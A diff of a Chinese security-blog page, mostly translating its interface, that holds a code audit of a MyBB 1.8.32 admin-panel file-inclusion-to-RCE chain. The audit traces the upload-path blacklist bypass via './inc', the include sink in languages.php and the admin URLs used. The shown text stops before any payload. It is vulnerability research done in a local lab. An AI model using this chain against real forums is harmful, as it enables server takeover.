@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
@@ -19,15 +19,15 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/red/pace-theme-minimal.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"lucifer11.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lucifer11.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="MYBB论坛简介及漏洞历史MYBB论坛简介   MyBB，以前是MyBBoard，最初是MyBulletinBoard，是由MyBB group开发的免费和开源论坛软件。用PHP编写的，支持MySQL, PostgreSQL和SQLite数据库系统，此外，还具有数据库failover它支持多种语言，并在LGPL下获得许可该软件允许用户通过MyBB促进社区的交互。">
+    <meta name="description" content="追踪 MyBB 管理配置、上传路径与文件包含，保留源码位置和黑盒验证。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="mybb 1.8.32 代码审计 + LFI RCE 复现">
 <meta property="og:url" content="https://lucifer11.xyz/2023/01/17/mybb1-8-32-LFI-RCE/index.html">
 <meta property="og:site_name" content="0xfd&#39;s blog">
-<meta property="og:description" content="MYBB论坛简介及漏洞历史MYBB论坛简介   MyBB，以前是MyBBoard，最初是MyBulletinBoard，是由MyBB group开发的免费和开源论坛软件。用PHP编写的，支持MySQL, PostgreSQL和SQLite数据库系统，此外，还具有数据库failover它支持多种语言，并在LGPL下获得许可该软件允许用户通过MyBB促进社区的交互。">
-<meta property="og:locale" content="en_US">
+<meta property="og:description" content="追踪 MyBB 管理配置、上传路径与文件包含，保留源码位置和黑盒验证。">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb1.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb2.png">
@@ -58,9 +58,12 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb27.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb28.png">
 <meta property="article:published_time" content="2023-01-17T01:08:39.000Z">
-<meta property="article:modified_time" content="2023-01-18T08:08:10.883Z">
+<meta property="article:modified_time" content="2023-01-17T01:08:39.000Z">
 <meta property="article:author" content="253">
-<meta property="article:tag" content="漏洞利用复现">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="MyBB">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb.png">
 
@@ -69,7 +72,7 @@
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://lucifer11.xyz/2023/01/17/mybb1-8-32-LFI-RCE/","path":"2023/01/17/mybb1-8-32-LFI-RCE/","title":"mybb 1.8.32 代码审计 + LFI RCE 复现"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lucifer11.xyz/2023/01/17/mybb1-8-32-LFI-RCE/","path":"2023/01/17/mybb1-8-32-LFI-RCE/","title":"mybb 1.8.32 代码审计 + LFI RCE 复现"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
 <title>mybb 1.8.32 代码审计 + LFI RCE 复现 | 0xfd's blog</title>
@@ -84,6 +87,7 @@
 <meta name="color-scheme" content="dark">
 <link rel="stylesheet" href="/css/cyberpunk.css">
 <script src="/js/gargantua.js" defer></script>
+<script src="/js/reader.js" defer></script>
 
   <noscript>
     <link rel="stylesheet" href="/css/noscript.css">
@@ -98,7 +102,7 @@
     <div class="column">
       <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    <div class="toggle" aria-label="切换导航栏" role="button">
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
@@ -117,7 +121,7 @@
   </div>
 
   <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
         <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
@@ -126,9 +130,9 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-知识库"><a href="/knowledge/" rel="section"><i class="fa fa-book fa-fw"></i>知识库</a></li><li class="menu-item menu-item-导读"><a href="/guide/" rel="section"><i class="fa fa-compass fa-fw"></i>导读</a></li><li class="menu-item menu-item-分类"><a href="/categories/" rel="section"><i class="fa fa-folder-open fa-fw"></i>分类</a></li><li class="menu-item menu-item-标签"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-关于"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
       <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
       </li>
   </ul>
@@ -143,7 +147,7 @@
   </span>
   <div class="search-input-container">
     <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="Searching..." spellcheck="false"
+           placeholder="搜索..." spellcheck="false"
            type="search" class="search-input">
   </div>
   <span class="popup-btn-close" role="button">
@@ -168,10 +172,10 @@
     <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
-          Table of Contents
+          文章目录
         </li>
         <li class="sidebar-nav-overview">
-          Overview
+          站点概览
         </li>
       </ul>
 
@@ -187,25 +191,25 @@
     <img class="site-author-image" itemprop="image" alt="253"
       src="/images/fifteen-katana-zero-katana-zero.gif">
   <p class="site-author-name" itemprop="name">253</p>
-  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+  <div class="site-description" itemprop="description">漏洞分析、利用机制、二进制研究与安全工程</div>
 </div>
 <div class="site-state-wrap animated">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">214</span>
-          <span class="site-state-item-name">posts</span>
+          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">78</span>
-        <span class="site-state-item-name">categories</span></a>
+        <span class="site-state-item-count">65</span>
+        <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">41</span>
-        <span class="site-state-item-name">tags</span></a>
+        <span class="site-state-item-count">312</span>
+        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
@@ -238,7 +242,7 @@
 
         </div>
       </div>
-        <div class="back-to-top animated" role="button" aria-label="Back to top">
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
           <i class="fa fa-arrow-up"></i>
           <span>0%</span>
         </div>
@@ -248,7 +252,7 @@
     <div class="sidebar-inner sidebar-blogroll">
       <div class="links-of-blogroll animated">
         <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
-          Links
+          链接
         </div>
         <ul class="links-of-blogroll-list">
             <li class="links-of-blogroll-item">
@@ -278,7 +282,7 @@
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://lucifer11.xyz/2023/01/17/mybb1-8-32-LFI-RCE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -288,12 +292,12 @@
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="0xfd's blog">
-      <meta itemprop="description" content="All things about infosec & ctf">
+      <meta itemprop="description" content="漏洞分析、利用机制、二进制研究与安全工程">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
       <meta itemprop="name" content="mybb 1.8.32 代码审计 + LFI RCE 复现 | 0xfd's blog">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content="追踪 MyBB 管理配置、上传路径与文件包含，保留源码位置和黑盒验证。">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -306,52 +310,50 @@
       <span class="post-meta-item-icon">
         <i class="far fa-calendar"></i>
       </span>
-      <span class="post-meta-item-text">Posted on</span>
+      <span class="post-meta-item-text">发表于</span>
 
-      <time title="Created: 2023-01-17 09:08:39" itemprop="dateCreated datePublished" datetime="2023-01-17T09:08:39+08:00">2023-01-17</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2023-01-18 16:08:10" itemprop="dateModified" datetime="2023-01-18T16:08:10+08:00">2023-01-18</time>
+      <time title="创建时间：2023-01-17 09:08:39" itemprop="dateCreated datePublished" datetime="2023-01-17T09:08:39+08:00">2023-01-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
       </span>
-      <span class="post-meta-item-text">In</span>
+      <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞利用复现</span></a>
+          <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">漏洞研究</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">源码审计</span></a>
         </span>
     </span>
 
   
-    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
-      <span class="post-meta-item-text">Views: </span>
+      <span class="post-meta-item-text">阅读次数：</span>
       <span id="busuanzi_value_page_pv"></span>
     </span>
     <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
+    <span class="post-meta-item" title="本文字数">
       <span class="post-meta-item-icon">
         <i class="far fa-file-word"></i>
       </span>
-      <span class="post-meta-item-text">Word count in article: </span>
+      <span class="post-meta-item-text">本文字数：</span>
       <span>2.2k</span>
     </span>
-    <span class="post-meta-item" title="Reading time">
+    <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>8 mins.</span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
     </span>
 </div>
 
+            <div class="post-description">追踪 MyBB 管理配置、上传路径与文件包含，保留源码位置和黑盒验证。</div>
         </div>
       </header>
 
@@ -360,157 +362,157 @@
     
     <div class="post-body" itemprop="articleBody">
         <h1 id="MYBB论坛简介及漏洞历史"><a href="#MYBB论坛简介及漏洞历史" class="headerlink" title="MYBB论坛简介及漏洞历史"></a>MYBB论坛简介及漏洞历史</h1><h2 id="MYBB论坛简介"><a href="#MYBB论坛简介" class="headerlink" title="MYBB论坛简介"></a>MYBB论坛简介</h2><ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb.png"></li>
 </ul>
 <p>MyBB，以前是MyBBoard，最初是MyBulletinBoard，是由MyBB group开发的免费和开源论坛软件。用PHP编写的，支持MySQL, PostgreSQL和SQLite数据库系统，此外，还具有数据库<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvRmFpbG92ZXI=">failover<i class="fa fa-external-link-alt"></i></span>它支持多种语言，并在<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTEdQTA==">LGPL<i class="fa fa-external-link-alt"></i></span>下获得许可该软件允许用户通过MyBB促进社区的交互。</p>
 <span id="more"></span>
 
 <h2 id="MYBB论坛漏洞历史"><a href="#MYBB论坛漏洞历史" class="headerlink" title="MYBB论坛漏洞历史"></a>MYBB论坛漏洞历史</h2><p>在<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vc2VhcmNoP3E9bXliYiZ0eXBlPXdlYmFwcHMmcGxhdGZvcm09cGhw">exploit-db<i class="fa fa-external-link-alt"></i></span>上，最早出现的漏洞可追朔到2005年的一系列sql注入，由于其源码已经在github上开源，从此之后各种类型漏洞频发，还不包括没有公开提交到exploit-db上的漏洞，直到2022，未来一定会爆出更多漏洞，手动狗头。。。</p>
 <ul>
-<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb1.png"></p>
+<li><p><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb1.png"></p>
 </li>
-<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb2.png"></p>
+<li><p><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb2.png"></p>
 </li>
 </ul>
 <p>最近2023年1月12日又爆出了mybb 管理员面板的文件包含RCE,这个RCE其实是对之前的管理员面板文件包含RCE<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzIxMyNyZXBseS0xODk5MQ==">记一次mybb代码审计<i class="fa fa-external-link-alt"></i></span>的文件上传路径黑名单的绕过。</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb3.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb3.png"></li>
 <li><span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS95ZWxhbmcxMjN4L3N0YXR1cy8xNjEzNDMzMzgwOTgwNTQ3NTg0">mybb 1.8.32 RCE in admin panel report<i class="fa fa-external-link-alt"></i></span></li>
 </ul>
 <h1 id="php白盒源代码审计"><a href="#php白盒源代码审计" class="headerlink" title="php白盒源代码审计"></a>php白盒源代码审计</h1><p>首先从github下载<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL215YmIvbXliYi9yZWxlYXNlcy9kb3dubG9hZC9teWJiXzE4MzIvbXliYl8xODMyLnppcA==">mybb 1.8.32的源码<i class="fa fa-external-link-alt"></i></span>,IDE我用的是vscode编辑器</p>
 <h2 id="定位黑名单并找到绕过手段"><a href="#定位黑名单并找到绕过手段" class="headerlink" title="定位黑名单并找到绕过手段"></a>定位黑名单并找到绕过手段</h2><p>&#x2F;Upload&#x2F;admin&#x2F;modules&#x2F;config&#x2F;settings.php 1172 ~ 1178 行</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb10.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb10.png"></li>
 </ul>
 <p>首先，我们可以在Mybb中设置控制上传目录，但代码里有一个缓解措施，以防止利用</p>
 <p>如果查看代码，每个目录都有一个黑名单目录，因为如果可以上传文件</p>
 <p>在这个黑名单目录下，配合之后分析的文件包含漏洞很容易造成远程代码执行</p>
 <h2 id="缓解措施分析"><a href="#缓解措施分析" class="headerlink" title="缓解措施分析"></a>缓解措施分析</h2><p>&#x2F;Upload&#x2F;admin&#x2F;modules&#x2F;config&#x2F;settings.php 1200 ~ 1206 行</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb11.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb11.png"></li>
 </ul>
 <p>如果查看代码，比较之前创建的dynamic_include_directores_realpath的值</p>
 <p>使用用户输入的数组变量，如果它们相同则取消设置</p>
 <p>但是将这些设置更改为前面描述的4个黑名单目录以外的路径则可以实现文件上传</p>
 <h2 id="rebuild-settings-函数分析"><a href="#rebuild-settings-函数分析" class="headerlink" title="rebuild_settings()函数分析"></a>rebuild_settings()函数分析</h2><p>&#x2F;Upload&#x2F;inc&#x2F;functions.php 6967 ~ 6991 行</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb12.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb12.png"></li>
 </ul>
 <p>如果黑名单验证缓解措施函数通过，则将设置保存在数据库中，并调用rebuild_settings函数在数据库中搜索行，并写入inc&#x2F;settings.php。</p>
 <p>也就是说我们在设置面板中设置上传路径为黑名单路径以外的路径，则可以设置成功，并并调用rebuild_settings函数在数据库中搜索行写入inc&#x2F;settings.php，上传路径可以修改成功，反之如果设置黑名单里的路径则会失败。</p>
 <h2 id="头像上传"><a href="#头像上传" class="headerlink" title="头像上传"></a>头像上传</h2><p>&#x2F;Upload&#x2F;inc&#x2F;functions_upload.php 232 ~ 250 行</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb13.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb13.png"></li>
 </ul>
 <p>因为.&#x2F;inc不存在于settings.php的黑名单中，它可以绕过上传路径黑名单，查看代码中，它使用设置的上传路径来上传。因此，我们可以在inc文件夹中写入有限的文件</p>
 <p>&#x2F;Upload&#x2F;inc&#x2F;functions_upload.php 926 ~ 945 行</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb14.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb14.png"></li>
 </ul>
 <p>上传头像时，使用upload_file()函数上传，此时，我们之前设置的路径$path变量就输入进去了，成功上传文件到之前设置的路径。</p>
 <h2 id="定位文件包含漏洞"><a href="#定位文件包含漏洞" class="headerlink" title="定位文件包含漏洞"></a>定位文件包含漏洞</h2><p>这次的文件包含漏洞也是本次漏洞利用链中最关键的一环，没有它，就无法实现RCE。</p>
 <p>首先全局搜索inclued函数，在\mybb\admin\modules\config\languages.php页面的444行发现include函数：@include $editfile;</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb5.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb5.png"></li>
 </ul>
 <p>该函数包含editfile文件，进行查看该文件来源，可以看到430行该文件由folder文件夹和file文件拼接，其中420行看到file文件由post请求提交，接下来查看folder文件夹来源</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb6.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb6.png"></li>
 </ul>
 <p>通过该文件184行看到foler文件夹为MYBB_ROOT.”inc&#x2F;languages&#x2F;“.$editlang.”&#x2F;“，接下来查看editlang变量，通过189行看到判断该文件名后缀为php的文件是否存在，然后查看该文件下辖的php文件只有english.php文件，猜测editlang为english，稍后验证，该变量会通过post请求输入</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb7.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb7.png"></li>
 </ul>
 <p>现在文件的目录结构分析完毕，接下来查看该漏洞页面的接口位置：由于该文件目录为\mybb\admin\modules\config\languages.php，因此，入口为config模板的language方法中，其中控制器为edit，从375行可以看到，同时420行看到post请求中输入file文件</p>
 <ul>
-<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb8.png"></p>
+<li><p><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb8.png"></p>
 </li>
-<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb9.png"></p>
+<li><p><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb9.png"></p>
 </li>
 </ul>
 <p>因此我们查看该页面url大概为以下样子：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/index.php?module=config-languages&amp;action=edit</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="L2FkbWluL2luZGV4LnBocD9tb2R1bGU9Y29uZmlnLWxhbmd1YWdlcyZhY3Rpb249ZWRpdAo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/index.php?module=config-languages&amp;action=edit</span><br></pre></td></tr></table></figure>
 
 <p>现在进行分析，之前我们自己设置的目录为.&#x2F;inc，因此我们需要向该文件夹下进行上传一个图片，因此我们需要将上传文件目录修改为该文件夹，现在分析如何修改该文件夹：<br>通过对头像上传文件夹进行跟踪，发现在function_upload.php的241行，该文件夹由全局变量settings控制</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb15.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb15.png"></li>
 </ul>
 <p>对该变量进行跟踪，$mybb-&gt;settings[‘avataruploadpath’]，发现对$mybb-&gt;settings[‘uploadspath’]变量的控制就需要对文件进行修改进行查询，针对关键函数进行搜索：$db-&gt;update_query(“settings”发现在\mybb\admin\modules\config\settings.php文件下1254行：</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb16.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb16.png"></li>
 </ul>
 <p>通过value和name变量进行更新，其中value变量是从post请求中的upsetting数组中进行获取其name变量的值：</p>
 <p>我们跟踪avataruploadpath变量，进行搜索，有1166行定义数组，而avataruploadpath为数组中的参数，同时也有post请求的upsetting数组进行输入:</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb17.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb17.png"></li>
 </ul>
 <p>现在寻找数据传入方式，发现action方法为change，请求方式为post：</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb18.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb18.png"></li>
 </ul>
 <p>通过该页面17行，发现页面在index页面下调用的模板为config下的setting模板：</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb19.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb19.png"></li>
 </ul>
 <p>因此我们构建的页面就可以为这样，从该页面进行传入数据</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybb1832.cn/admin/index.php?module=config-settings&amp;action=change</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="aHR0cDovL3d3dy5teWJiMTgzMi5jbi9hZG1pbi9pbmRleC5waHA/bW9kdWxlPWNvbmZpZy1zZXR0aW5ncyZhY3Rpb249Y2hhbmdlCg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybb1832.cn/admin/index.php?module=config-settings&amp;action=change</span><br></pre></td></tr></table></figure>
 
 
 <h1 id="本地环境搭建与黑盒漏洞利用"><a href="#本地环境搭建与黑盒漏洞利用" class="headerlink" title="本地环境搭建与黑盒漏洞利用"></a>本地环境搭建与黑盒漏洞利用</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我是用的宝塔面板搭建的环境，宝塔面板安装参考官方<span class="exturl" data-url="aHR0cHM6Ly93d3cuYnQuY24vbmV3L2Rvd25sb2FkLmh0bWw=">下载安装使用宝塔产品<i class="fa fa-external-link-alt"></i></span></p>
 <ul>
 <li><p>niginx 1.22.1 + php 7.4.33 + phpmyadmin 5.2 + mysql 5.7.43</p>
 </li>
-<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb4.png"></p>
+<li><p><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb4.png"></p>
 </li>
 </ul>
 <p>宝塔面板安装好，并部署好环境之后，后米娜要做的就是修改本机电脑的hosts文件使<span class="exturl" data-url="aHR0cDovL3d3dy5teWJiMTgzMi5jbuWfn+WQjeaMh+WQkemdouadv+eOr+Wig+eahGlw5Zyw5Z2A5Y2z5Y+vLC8=">www.mybb1832.cn域名指向面板环境的IP地址即可，<i class="fa fa-external-link-alt"></i></span><br>正常访问，且是mybb 1.8.32版本：</p>
 <ul>
-<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb20.png"></li>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mybb20.png"></li>
 </ul>
 <h2 id="修改上传路径配置并上传头像"><a href="#修改上传路径配置并上传头像" class="headerlink" title="修改上传路径配置并上传头像"></a>修改上传路径配置并上传头像</h2><p>登入后台后访问，搜索”Avatar Upload Path”，将其改为”.&#x2F;inc”后，点击”save settings”：</p>
